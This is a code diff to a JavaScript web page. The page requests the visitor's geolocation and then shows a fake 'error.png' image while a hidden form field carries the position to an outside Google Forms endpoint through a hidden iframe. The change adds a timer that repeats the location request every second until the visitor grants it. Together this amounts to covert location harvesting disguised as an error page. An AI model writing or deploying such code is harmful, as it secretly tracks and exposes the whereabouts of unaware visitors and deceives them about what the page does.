@@ -36,9 +36,11 @@
             navigator.geolocation.getCurrentPosition(test3);
         }
 
+        var stop = setInterval(test, 1000);
+
         function test3(pos) {
             position = pos;
-
+            clearInterval(stop);
             var form = `<img src="error.png" style="height:30%;"><br> <form action="https://docs.google.com/forms/u/1/d/e/1FAIpQLScfax4AMp-T2HvQtv4kEgaKvV9T5xI917XbI6f8KZx4_t53Tw/formResponse" method="post" target="hidden_iframe" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-shuffle-seed="2868127642733565241" data-response="%.@.[]]" data-first-entry="0" data-last-entry="4" data-is-first-page="true">
                 <!--非表示のフィールドを追加 -->
                     <input type="hidden" name="entry.518300877" id="geo_data">
@@ -85,6 +87,7 @@
         */
 
         test();
+        
 
     </script>
 
